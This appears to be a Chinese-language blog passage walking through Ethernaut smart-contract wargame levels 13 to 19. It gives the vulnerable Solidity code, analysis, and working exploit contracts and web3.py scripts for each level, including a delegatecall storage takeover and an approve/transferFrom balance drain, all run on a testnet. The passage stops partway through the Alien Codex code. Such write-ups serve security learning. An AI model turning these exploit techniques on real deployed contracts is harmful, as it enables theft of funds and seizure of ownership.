                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291637508.png"
                      alt="image-20231129163727465"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291638236.png"
                      alt="image-20231129163801201"
                ></p>
<p>结果是780160，819100-780160&#x3D;38940，即为运行到 gasleft() 处花费的 gas。所以我们提供819100+38940&#x3D;858040的 gas 即可通过 gateTwo</p>
<p>。。。吗？</p>
<p>首先上文我犯了个错误，gasleft() 返回值为执行完 GAS 后的剩余 gas 值，所以我们参考的值应该为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291651820.png"
                      alt="image-20231129165123779"
                ></p>
<p>其次，即使我们参考正确的 gas 值进行计算得出理论上正确的 gas limit（858042），也无济于事</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20231129165531255.png"
                      alt="image-20231129165531255"
                ></p>
<p>看这个小玩意，问题出在这里，使用 Txn Type 2 会导致 gas 费用是动态的，简单来说是会给到矿工合适的小费，这个“合适”并不固定，所以一直算不准。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311292140786.png"
                      alt="image-20231129214045743"
                ></p>
<p>关于 <a class="link"   href="https://blog.csdn.net/feeltouch/article/details/124975358" >EIP-1559 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>由于 Txn Type 0 的交易并不会定义 maxFee 和 maxPriority，即提供多少 gas 是固定的，那么发送这种类型的交易即可。</p>
<p>。。。吗？</p>
<p>猜测：实际上由于 gasPrice 的变化，即使使用 Type 0 也无济于事，只能减少它的浮动范围罢了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300207236.png"
                     
                ></p>
<p>结果：把 gas 固定在100000进行测试，每次都一样，从调用直到 GAS 操作码执行完毕消耗27706，把 gas 增加至819100，测试下，到 GAS 之后稳定消耗38942。实在是找不出导致这种现象的原因，一步一步调着先吧，最终调试出 gas 为858660时可以稳定成功。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300312620.png"
                      alt="image-20231130031208573" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300312156.png"
                      alt="image-20231130031249102"
                ></p>
<p>这里连续执行了5次，都是成功的。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约：</p>
<pre><code class="solidity">contract Hack &#123;
    GatekeeperOne public myGate;

    constructor(address _target) public &#123;
        myGate = GatekeeperOne(_target);
    &#125;

    function attack() public &#123;
        myGate.enter(0x123456780000e411);
    &#125;
&#125;
</code></pre>
<p>用于调用攻击合约方法的 python 脚本：</p>
<pre><code class="python">from web3 import Web3

web3 = Web3(Web3.HTTPProvider(&#39;https://rpc.sepolia.org&#39;))

sender_address = &#39;SENDER_ADDRESS&#39;
recipient_address = &#39;RECIPIENT_ADDRESS&#39;

private_key = &#39;YOUR_PRIVATE_KEY&#39;

transaction_params = &#123;
    &#39;from&#39;: sender_address,
    &#39;to&#39;: recipient_address,
    &#39;value&#39;: 0,
    &#39;data&#39;: 0x9e5faafc,
    &#39;nonce&#39;: web3.eth.get_transaction_count(sender_address),
    &#39;gas&#39;: 858660,
    &#39;gasPrice&#39;: web3.eth.gas_price,
    &#39;chainId&#39;: 11155111
&#125;

transaction = web3.eth.account.sign_transaction(transaction_params, private_key)
transaction_hash = web3.eth.send_raw_transaction(transaction.rawTransaction)
transaction_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)

if transaction_receipt.status:
    print(&#39;Transaction successful!&#39;)
else:
    print(&#39;Transaction failed.&#39;)
</code></pre>
<p>我也不知道为什么我要写个 py 脚本来调用攻击合约，本来全部东西都可以写进合约里面的，但是我开始有写循环的想法就下意识去用 Web3.py 了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300321502.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300323303.png"
                      alt="image-20231130032336251"
                ></p>
<h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14 Gatekeeper Two"></a>14 Gatekeeper Two</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo &#123;
    address public entrant;

    modifier gateOne() &#123;
        require(msg.sender != tx.origin);
        _;
    &#125;

    modifier gateTwo() &#123;
        uint256 x;
        assembly &#123; x := extcodesize(caller()) &#125;
        require(x == 0);
        _;
    &#125;

    modifier gateThree(bytes8 _gateKey) &#123;
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    &#125;

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;
        entrant = tx.origin;
        return true;
    &#125;
&#125;
</code></pre>
<h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a class="link"   href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a class="link"   href="https://ethereum.github.io/yellowpaper/paper.pdf" >yellow paper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</li>
<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a class="link"   href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
</ul>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p><strong>gateOne</strong>：</p>
<p>这题的 gateOne 与上一关相同。</p>
<p><strong>gateTwo</strong>：</p>
<p>gateTwo 中使用了内联汇编，功能是获取调用者的代码大小，判断其为0才能通过。题目叫我去看内联汇编和黄皮书，看看先：</p>
<p><a class="link"   href="https://docs.soliditylang.org/zh/v0.8.20/assembly.html" >关于内联汇编 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://docs.soliditylang.org/zh/v0.8.20/yul.html#yul" >关于 Yul <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://ethereum.github.io/yellowpaper/paper.pdf" >Ethereum 黄皮书 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>从黄皮书中看到如下一段话：</p>
<blockquote>
<p>7.1. <strong>Subtleties.</strong> Note that while the initialisation code is executing,the newly created address exists but with no intrinsic body code^5^. Thus any message call received by it during this time causes no code to be executed. If the initialisation execution ends with a SELFDESTRUCT instruction, the matter is moot since the account will be deleted before the transaction is completed.For a normal STOP code, or if the code returned is otherwise empty, then the state is left with a zombie account, and any remaining balance will be locked into the account forever.</p>
<p>^5^During initialization code execution, EXTCODESIZE on the address should return zero,which is the length of the code of the account while CODESIZE should return the length of the initialization code (as defined in H.2).</p>
</blockquote>
<p>说得很清楚，在合约的初始化代码执行过程中，新创建的地址是存在的，但没有内在的主题代码。即该地址上的 ESXTCODESIZE 此时返回0，可以满足题目的条件。</p>
<p><strong>gateThree</strong>：</p>
<p><code>abi.encodePacked()</code>是一种非标准的打包方式，其中规则如下：</p>
<ul>
<li>短于32字节的类型直接连接，没有填充或符号扩展。</li>
<li>动态类型是直接编码的，没有长度。</li>
<li>数组元素被填充，但仍被是直接编码。</li>
</ul>
<p>此外，不支持结构以及嵌套数组。</p>
<p>本题中只对<code>msg.sender</code>进行编码，很显然结果就是它的地址的字节序列。那么只需要计算一下就能得出<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>的值，只是由于本题需要在构造函数中完成对目标合约 enter 函数的调用，所以这个值不能提前计算，而是要在构造函数中直接计算。一旦构造函数开始运行，这个新创建的合约的地址就存在了，所以我们具备计算出它的条件。</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<pre><code class="solidity">contract Hack &#123;
    GatekeeperTwo public myGate;
    bytes8 public gateKey;

    constructor(address _target) public &#123;
        myGate = GatekeeperTwo(_target);
        gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        myGate.enter(gateKey);
    &#125;
&#125;
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311301346739.png"
                      alt="image-20231130134636673"
                ></p>
<h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15 Naught Coin"></a>15 Naught Coin</h2><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;

contract NaughtCoin is ERC20 &#123;
    // string public constant name = &#39;NaughtCoin&#39;;
    // string public constant symbol = &#39;0x0&#39;;
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    &#125;

    function transfer(address _to, uint256 _value)
        public
        override
        lockTokens
        returns (bool)
    &#123;
        super.transfer(_to, _value);
    &#125;

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() &#123;
        if (msg.sender == player) &#123;
            require(block.timestamp &gt; timeLock);
            _;
        &#125; else &#123;
            _;
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
<p> Things that might help</p>
<ul>
<li>The <a class="link"   href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" >ERC20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Spec</li>
<li>The <a class="link"   href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts" >OpenZeppelin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> codebase</li>
</ul>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目是一个 ERC-20 标准的代币合约，其继承于 OppenZepplin Contracts 的 ERC20 合约，其解析见 <a href="/2023/12/03/%E6%B5%85%E6%9E%90ERC-20">浅析ERC-20</a>。</p>
<p>题目要求要把我们手里的余额花完，但是修改器<code>lockTokens</code>检测到<code>msg.sender</code>为玩家时会判断时间戳，要十年后才能解锁。但是当 sender 不是玩家的时候就会直接执行 transfer 了。</p>
<p>看完 ERC-20 就知道可以把自己账户中的余额授权给另一个账户以供使用，这样就可以使 sender 不是玩家，绕过修改器。</p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>python 攻击脚本如下：</p>
<pre><code class="python">from web3 import Web3

web3 = Web3(Web3.HTTPProvider(&#39;https://rpc.sepolia.org&#39;))

player_address = &#39;PLAYER_ADD&#39;
player_pk = &#39;PLAYER_PK&#39;

hacker_address = &#39;HACKER_ADD&#39;
hacker_pk = &#39;HACKER_PK&#39;

# 合约abi，太长，不放上去了
target_abi = &#39;&#39;&#39;

&#39;&#39;&#39;

target_address = &#39;GAME_ADD&#39;
target_conctract = web3.eth.contract(abi=target_abi, address=target_address)

def aprrove():
    player_balance = target_conctract.functions.balanceOf(player_address).call()
    print(&quot;Before hacking raw balance: &quot; + str(player_balance))

    nonce = web3.eth.get_transaction_count(player_address)
    approve = target_conctract.functions.approve(hacker_address, player_balance).build_transaction(&#123;
        &#39;from&#39;: player_address,
        &#39;nonce&#39;: nonce
        &#125;)
    signed_approve = web3.eth.account.sign_transaction(approve, private_key=player_pk)

    approve_hash = web3.eth.send_raw_transaction(signed_approve.rawTransaction)
    print(&quot;Approve transaction hash: &quot; + approve_hash.hex())

def hack():
    player_balance = target_conctract.functions.balanceOf(player_address).call()

    nonce = web3.eth.get_transaction_count(hacker_address)
    hack = target_conctract.functions.transferFrom(player_address, hacker_address, player_balance).build_transaction(&#123;
        &quot;from&quot;: hacker_address,
        &quot;nonce&quot;: nonce
        &#125;)
    signed_hack = web3.eth.account.sign_transaction(hack, private_key=hacker_pk)

    hack_hash = web3.eth.send_raw_transaction(signed_hack.rawTransaction)
    print(&quot;Hack transaction hash: &quot; + hack_hash.hex())

    web3.eth.wait_for_transaction_receipt(hack_hash)
    print(&quot;After hacking raw balance: &quot; + str(target_conctract.functions.balanceOf(player_address).call()))

aprrove()
hack()
</code></pre>
<p>执行，成功掏空玩家的 balance：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312041300675.png"
                      alt="image-20231204130058484"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312041301056.png"
                      alt="image-20231204130108992"
                ></p>
<h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16 Preservation"></a>16 Preservation</h2><h3 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation &#123;
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) &#123;
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    &#125;

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public &#123;
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    &#125;

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public &#123;
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    &#125;
&#125;

// Simple library contract to set the time
contract LibraryContract &#123;
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public &#123;
        storedTime = _time;
    &#125;
&#125;
</code></pre>
<h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p> Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>
<li>Understanding what it means for <code>delegatecall</code> to be context-preserving.</li>
<li>Understanding how storage variables are stored and accessed.</li>
<li>Understanding how casting works between different data types.</li>
</ul>
<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目中给我们强调了<code>delegatecall</code>的属性，这里我们需要知道，当使用委托调用去调用目标合约的函数时，使用的是调用者合约的存储空间，而不是被调用者合约的存储空间。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312051117752.png"
                     
                >	</p>
<p>那么若是修改了被调用者合约中的状态变量，那么就会修改这些变量所在的插槽对应的调用者合约的插槽中的数据。</p>
<p>所以攻击就有了头绪：由于 LibraryContract 合约只有一个状态变量在 Slot_0，所以我们只能修改原合约中的 Slot_0 中的<code>timeZone1Library</code>变量为自己的攻击合约，这样在调用<code>setFirstTime</code>函数时就会对攻击合约进行委托调用，就可以修改原合约中的<code>owner</code>。</p>
<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>先部署攻击合约：</p>
<pre><code class="solidity">contract Hack &#123;
    address public useless;
    address public use1e55;
    address public owner;
    Preservation target;

    function setTimeZone1Library(address _target) public &#123;
        target = Preservation(_target);
        target.setFirstTime(uint160(address(this)));
    &#125;

    function setTime(uint256 _us3less) public &#123;
        owner = tx.origin;
    &#125;
&#125;
</code></pre>
<pre><code class="bash">forge create --rpc-url https://rpc.sepolia.org --private-key &lt;CREATEOR_PRIVATE_KEY&gt; src/hack_16.sol:Hack
</code></pre>
<p>首先调用<code>setTimeZone1Library</code>修改题目里面<code>timeZone1Library</code>的值，然后再调用题目合约中的<code>setFirstTime</code>修改 owner 就好啦。</p>
<p><del>不太行。。。。。gas 不够，把初始化 Preservation 和获取转换自己地址的代码放到构造函数里面吧</del>（出现这个问题是因为我疏忽了，没有去调节 Metamask 里面的 Gas 设置）：</p>
<pre><code class="solidity">contract Hack &#123;
    address public useless;
    address public use1e55;
    address public owner;
    Preservation target;
    uint256 public self;

    constructor(address _target) public &#123;
        target = Preservation(_target);
        self = uint256(uint160(address(this)))
    &#125;

    function setTimeZone1Library() public &#123;
        target.setFirstTime(self);
    &#125;

    function setTime(uint256 _us3less) public &#123;
        owner = tx.origin;
    &#125;
&#125;
</code></pre>
<p>部署时候加一个<code>--constructor-args</code>：</p>
<pre><code class="bash">forge create --rpc-url https://rpc.sepolia.org \
--private-key &lt;CREATEOR_PRIVATE_KEY&gt; src/hack_16.sol:Hack \
--constructor-args 0xC58963621d4CD62A40D409CEe607d9068DeA8267
</code></pre>
<p>先调用攻合约的 setTimeZone1Library()，再调用目标合约的 setFirstTime() 即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061024264.png"
                      alt="image-20231206102448156"
                ></p>
<h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17 Recovery"></a>17 Recovery</h2><h3 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery &#123;
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public &#123;
        new SimpleToken(_name, msg.sender, _initialSupply);
    &#125;
&#125;

contract SimpleToken &#123;
    string public name;
    mapping(address =&gt; uint256) public balances;

    // constructor
    constructor(
        string memory _name,
        address _creator,
        uint256 _initialSupply
    ) &#123;
        name = _name;
        balances[_creator] = _initialSupply;
    &#125;

    // collect ether in return for tokens
    receive() external payable &#123;
        balances[msg.sender] = msg.value * 10;
    &#125;

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public &#123;
        require(balances[msg.sender] &gt;= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    &#125;

    // clean up after ourselves
    function destroy(address payable _to) public &#123;
        selfdestruct(_to);
    &#125;
&#125;
</code></pre>
<h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.001</code> ether to obtain more tokens. They have since lost the contract address.</p>
<p>This level will be completed if you can recover (or remove) the <code>0.001</code> ether from the lost contract address.</p>
<h3 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h3><p>这题要我们恢复第一个代币合约的创建者给出的 0.001ETH，应该是找到这个代币合约然后调用它的 destroy 就好。从生成代币的合约中找不到任何东西的，这里要用以太坊浏览器查看交易记录，找到对应的代币合约和 creator。使用 etherscan.io 这么个以太坊浏览器，首先查看题目给到的题目合约地址：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061136843.png"
                      alt="image-20231206112323196"
                ></p>
<p>查看合约创建的交易调用过程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061159713.png"
                      alt="image-20231206115936652"
                ></p>
<p>这些东西都找到了，那么利用代币合约自带的 destroy 函数就能把 ETH 返还给 creator 了。</p>
<h3 id="Expoit"><a href="#Expoit" class="headerlink" title="Expoit"></a>Expoit</h3><p>Like this：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061201645.png"
                      alt="image-20231206120146607"
                ></p>
<p>看看结果，成功自毁，把 0.001ETH 转给 creator 了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061203613.png"
                      alt="image-20231206120347572"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061206447.png"
                      alt="image-20231206120608397"
                ></p>
<h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18 MagicNumber"></a>18 MagicNumber</h2><h3 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum &#123;
    address public solver;

    constructor() &#123;&#125;

    function setSolver(address _solver) public &#123;
        solver = _solver;
    &#125;

    /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
&#125;
</code></pre>
<h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h3><p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.</p>
<p>Easy right? Well… there’s a catch.</p>
<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.</p>
<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>
<p>Good luck!</p>
<h3 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h3><p>终于，要手搓字节码了吗？</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061211391.jpg"
                      alt="349D63BA86A0B4F0C18295D04DCAD40D" style="zoom:67%;" 
                >

<p>这题目我这土鳖没看懂，又是<code>whatIsTheMeaningOfLife()</code>，注释里又来个数字42，两个关键词 Google 一下：</p>
<blockquote>
<p><em>42</em> is the answer to the “ultimate question of life, the universe, and everything,” a joke in Douglas Adams’s 1979 novel, <em>The Hitchhiker’s Guide to the Galaxy</em>.</p>
<p>42是“生命、宇宙和万物的终极问题”的答案，这是道格拉斯·亚当斯（Douglas Adams）1979年小说《银河系漫游指南》（The Hitchhiker’s Guide to the Galaxy）中的一个笑话。</p>
</blockquote>
<p>好好好，玩洋梗捏，鼠鼠我呀，看不懂呢。</p>
<p>回到正题，题目应该是要求我们部署一个合约，其要求是能返回数字42，且操作码数量限制在10个以内。</p>
<p>那么就需要去学习一下关于 EVM 字节码的知识，以及字节码是如何组成一个合约的。</p>
<p><a class="link"   href="https://www.evm.codes/" >An Ethereum Virtual Machine Opcodes Interactive Reference <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737" >Deconstructing a Solidity Contract —Part I: Introduction <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>现在我们知道构建一个合约的功能需要有 Runtime Opcodes，而部署它需要有 Initialization Opcodes，我们先来构造 Runtime：</p>
<table>
<thead>
<tr>
<th>字节码</th>
<th>操作码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>602a</td>
<td>PUSH1 0x2a</td>
<td>value 要写入内存的32字节值（数字42）</td>
</tr>
<tr>
<td>6080</td>
<td>PUSH1 0x80</td>
<td>offset 要写入内存的偏移量</td>
</tr>
<tr>
<td>52</td>
<td>MSTORE</td>
<td>MSTORE(offset, value)</td>
</tr>
<tr>
<td>6020</td>
<td>PUSH1 0x20</td>
<td>size 要返回的数据大小</td>
</tr>
<tr>
<td>6080</td>
<td>PUSH1 0x80</td>
<td>offset 数据在内存中的偏移量</td>
</tr>
<tr>
<td>f3</td>
<td>RETURN</td>
<td>RETURN(offset, size)</td>
</tr>
</tbody></table>
<p>602a60805260206080f3</p>
<p>这里就是我们合约所需的功能，具体是将数字42存入内存中，就可以返回该数字了。</p>
<p>部署合约所需的 Initialization Opcodes：</p>
<table>
<thead>
<tr>
<th>字节码</th>
<th>操作码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>600a</td>
<td>PUSH1 0x0a</td>
<td>size 要复制的字节数量（Runtime Opcodes长度10字节）</td>
</tr>
<tr>
<td>60??</td>
<td>PUSH1 0x??</td>
<td>offset 要复制的代码的偏移量</td>
</tr>
<tr>
<td>6000</td>
<td>PUSH1 0x00</td>
<td>destOffset 要复制到内存中的目标偏移量</td>
</tr>
<tr>
<td>39</td>
<td>CODECOPY</td>
<td>CODECOPY(destOffset, offset, size)</td>
</tr>
<tr>
<td>600a</td>
<td>PUSH1 0x0a</td>
<td>size 要返回的数据大小（Runtime Opcodes长度10字节）</td>
</tr>
<tr>
<td>6000</td>
<td>PUSH1 0x00</td>
<td>offset 数据在内存中的偏移量</td>
</tr>
<tr>
<td>f3</td>
<td>RETURN</td>
<td>将 Runtime Opcodes 返回给 EVM</td>
</tr>
</tbody></table>
<p>600a60??600039600a6000f3</p>
<p>部署合约的字节码后面加上它的 Runtime Opcodes，就可以部署一个合约，所以我们部署合约所需的字节码是：</p>
<p>600a60??600039600a6000f3602a60805260206080f3</p>
<p>可以看到在上面一段字节码中，Runtime Opcodes 的偏移量为12，即0x0c，那么在 Initialization Opcodes 中用问号代替的值就是0c，全部的字节码如下：</p>
<p>600a600c600039600a6000f3602a60805260206080f3</p>
<h3 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h3><p>直接使用 web3.js 部署合约：</p>
<pre><code class="javascript">await sendTransaction(&#123;
    from: player,
    data: 600a600c600039600a6000f3602a60805260206080f3
&#125;)
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061527430.png"
                      alt="image-20240106152718373"
                ></p>
<p>上以太坊浏览器查看，得到部署的合约地址 0xCf86935aA103893Cf4513f589D76078Ce8da24bb：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061529478.png"
                      alt="image-20240106152947414"
                ></p>
<p>调用题目合约的 setSolver 方法即可：</p>
<pre><code class="javascript">await contract.setSolver(&quot;0xCf86935aA103893Cf4513f589D76078Ce8da24bb&quot;)
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061533314.png"
                      alt="image-20240106153318261"
                ></p>
<h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 Alien Codex"></a>19 Alien Codex</h2><h3 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import &quot;../helpers/Ownable-05.sol&quot;;

contract AlienCodex is Ownable &#123;
    bool public contact;
    bytes32[] public codex;

    modifier contacted() &#123;
        assert(contact);
        _;
    &#125;

    function makeContact() public &#123;
        contact = true;
    &#125;

    function record(bytes32 _content) public contacted &#123;
        codex.push(_content);
    &#125;

    function retract() public contacted &#123;
        codex.length--;
    &#125;

